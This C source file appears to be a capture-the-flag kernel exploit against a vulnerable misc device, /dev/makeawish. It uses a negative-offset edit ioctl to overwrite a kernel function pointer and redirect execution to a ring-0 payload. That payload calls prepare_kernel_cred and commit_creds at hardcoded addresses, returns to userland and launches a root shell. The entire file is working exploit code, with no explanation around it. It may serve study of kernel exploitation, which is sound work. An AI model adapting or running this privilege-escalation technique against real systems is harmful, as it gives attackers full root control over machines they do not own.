#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <sys/wait.h>

#define DO_CREATE    0xc018ca00 
#define DO_EDIT      0xc018ca01 
#define DO_READ      0xc018ca02 
#define DO_WISH      0xc018ca03 

// Global variables
int fd = 0; 
#define NUM_WISH 0x10

struct req {
    uint64_t idx;
    int      offset; 
    uint64_t data;
};

// Module functions
int do_create(char * data) {
    struct req req; 
    req.idx = 0; 
    req.offset = 0;
    req.data = (uint64_t) data; 
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Performed create\n");
    return 0;
}

int do_edit(uint64_t idx, int offset, char * data) {
    struct req req; 
    req.idx = idx; 
    req.offset = offset;
    req.data = (uint64_t) data; 
    
    if (ioctl(fd, DO_EDIT, &req) < 0) {
        perror("[!] Edit failed");
        return -1;
    }
    //printf("[+] Performed edit\n");
    return 0;
}

int do_read(uint64_t idx, char * data) {
    struct req req; 
    req.idx = idx; 
    req.offset = 0;
    req.data = (uint64_t) data; 
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int do_wish(uint64_t idx) {
    struct req req; 
    req.idx = idx; 
    req.offset = 0;
    req.data = 0x0; 
    
    if (ioctl(fd, DO_WISH, &req) < 0) {
        perror("[!] Wish failed");
        return -1;
    }
    printf("[+] Performed wish\n");
    return 0;
}

int write_pointer(uint64_t idx, uint64_t ptr) {

    char buf[0x10] = {0}; 
    *(uint64_t *)buf = ptr; 

    for (int i = 0; i < 8; i++) {
        do_edit(1, -8+i, buf+i); 
    }
    
    printf("[+] Performed 8 byte write\n"); 
    return 0; 
}

// PWNY STUFF
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

void get_shell(int cat) {
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

void escalate() {
    __asm__(
        ".intel_syntax noprefix;"
        "movabs rdi, 0xffffffff82c0e900;"  // init_task
        "movabs rcx, 0xffffffff8132b390;"   // prepare_kernel_cred
	    "call rcx;"
        
        "mov rdi, rax;"
	    "movabs rcx, 0xffffffff8132b0f0;"   // commit_creds
	    "call rcx;"

        // restore all the registers
        "swapgs;"
        "mov r15, user_ss;"
        "push r15;"
        "mov r15, user_sp;"
        "push r15;"
        "mov r15, user_rflags;"
        "push r15;"
        "mov r15, user_cs;"
        "push r15;"
        "mov r15, user_rip;"
        "push r15;"
        "iretq;"
        ".att_syntax;"
    );
}

int main(void) {
    char buf[0x200] = {0};
    int ret = 0x0; 
    
    // CPU setaffinity
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }

    // Open device
    printf("[+] Opening device\n");
    if ((fd = open("/dev/makeawish", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // Perform create
    memset(buf, 0x41, sizeof(buf)); 
    for (int i = 0; i < NUM_WISH; i++) {
        do_create(buf);
    }
    
    printf("[+] Escalate is at 0x%llx\n", escalate); 
    write_pointer(1, (uint64_t)escalate); 
    
    // PWN TIME
    save_state(); 
    signal(SIGSEGV, get_shell);
    
    for (int i = 0; i < NUM_WISH; i++) {
        do_wish(i);
    }

    return 0; 
}

// wish_count = 0xffffffffa0201900
// wish_array = 0xffffffffa0201680
